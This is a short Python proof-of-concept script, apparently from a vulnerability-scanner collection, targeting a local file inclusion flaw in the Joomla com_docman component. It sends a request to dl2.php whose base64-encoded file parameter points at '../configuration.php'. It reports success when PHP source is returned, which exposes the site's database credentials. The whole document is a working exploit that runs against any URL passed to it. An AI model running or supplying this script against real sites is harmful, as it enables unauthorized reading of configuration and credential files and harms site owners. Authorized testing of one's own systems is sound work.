#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: joomla组件com_docman本地文件包含
referer: https://www.exploit-db.com/exploits/37620
author: Lucifer
description: joomla组件com_docman 文件com_docman/dl2.php中参数file被base64解码后可造成文件包含漏洞。
'''
import sys
import requests
import warnings
from termcolor import cprint

class joomla_com_docman_lfi_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA="
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"<?php" in req.text:
                cprint("[+]存在joomla组件com_docman本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = joomla_com_docman_lfi_BaseVerify(sys.argv[1])
    testVuln.run()